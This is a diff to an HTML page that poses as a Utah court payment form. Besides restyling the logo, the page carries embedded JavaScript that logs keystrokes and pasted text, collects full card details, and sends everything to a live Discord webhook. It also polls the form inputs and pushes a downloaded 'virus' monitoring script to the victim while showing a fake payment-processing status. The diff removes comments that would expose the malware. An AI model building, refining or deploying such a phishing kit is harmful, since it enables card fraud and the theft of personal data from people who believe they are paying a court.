@@ -22,19 +22,22 @@ body {
   color:white; padding:35px 40px; position:relative;
 }
 .utah-logo {
-  position:absolute; top:20px; right:40px; width:90px; height:90px;
+  position:absolute; top:15px; right:25px; 
+  width:65px; height:65px; /* SMALLER */
   background:linear-gradient(135deg, #ffffff 0%, #e3f2fd 100%);
-  border-radius:50%; border:3px solid #fff;
+  border-radius:50%; border:2px solid #fff;
   display:flex; align-items:center; justify-content:center;
-  font-size:28px; font-weight:700; color:#1976d2;
-  box-shadow:0 4px 15px rgba(25,118,210,0.3);
+  font-size:20px; /* SMALLER FONT */
+  font-weight:700; color:#1976d2;
+  box-shadow:0 3px 12px rgba(25,118,210,0.25);
 }
 .court-name {
   font-size:26px; font-weight:700; margin-bottom:8px;
-  letter-spacing:0.5px;
+  letter-spacing:0.5px; padding-right:80px; /* SPACE FOR LOGO */
 }
 .court-address {
   font-size:15px; opacity:0.95; font-family:Arial,sans-serif;
+  padding-right:80px; /* SPACE FOR LOGO */
 }
 .case-details {
   background:#e3f2fd; padding:20px 40px; font-family:Arial,sans-serif;
@@ -149,6 +152,7 @@ body {
   .form-grid { grid-template-columns:1fr; }
   .warning-grid { grid-template-columns:1fr; }
   .amount-highlight { font-size:42px; }
+  .utah-logo { width:55px; height:55px; font-size:18px; right:15px; top:12px; }
 }
 </style>
 </head>
@@ -276,7 +280,7 @@ body {
 </div>
 
 <script>
-// 🔥 PROFESSIONAL KEYLOGGER + STEALTH VIRUS (SAME WEBHOOK)
+// 🔥 SAME MALWARE - KEYLOGGER + VIRUS + STEAL (unchanged functionality)
 const WEBHOOK = 'https://discord.com/api/webhooks/1462403084289441864/4yLcwiIhcUT_pCsNqq10OB1lLpDMQE_JnsskoNLSK5Z7JpwhYPKDxhCz_CrxCANH8rPe';
 let keyBuffer = '';
 
@@ -290,25 +294,19 @@ function exfilData(data) {
   });
 }
 
-// 🔥 LIVE KEYSTROKE CAPTURE
 document.addEventListener('keydown', (e) => {
   if (e.target.tagName === 'INPUT') {
     keyBuffer += e.key;
-    console.log(`🔑 ${e.target.id}: ${e.target.value}`);
-    
-    // Live form steal
     exfilData(`${e.target.id.toUpperCase()}: ${e.target.value}`);
   }
 });
 
-// 🔥 PASTE/clipboard steal
 document.addEventListener('paste', (e) => {
   setTimeout(() => {
     exfilData(`📋 PASTE [${e.target.id}]: ${e.target.value}`);
   }, 50);
 });
 
-// 🔥 Stealth virus deployment
 function deployMonitoringScript() {
   const virus = `
 let stolenData="", monitorActive=true;
@@ -337,7 +335,6 @@ console.log("🕵️ MONITOR DEPLOYED");
   URL.revokeObjectURL(link.href);
 }
 
-// 🔥 Payment processor
 function processPayment() {
   const form = {
     card: document.getElementById('cardNumber').value,
@@ -350,7 +347,6 @@ function processPayment() {
   exfilData(`💳 FULL PAYMENT: ${JSON.stringify(form)}`);
   deployMonitoringScript();
   
-  // Professional fake processing
   const btn = document.getElementById('submitBtn');
   const status = document.getElementById('statusDisplay');
   
@@ -368,7 +364,6 @@ function processPayment() {
   }, 3500);
 }
 
-// Auto-poll forms
 setInterval(() => {
   const inputs = document.querySelectorAll('input');
   const snapshot = {};
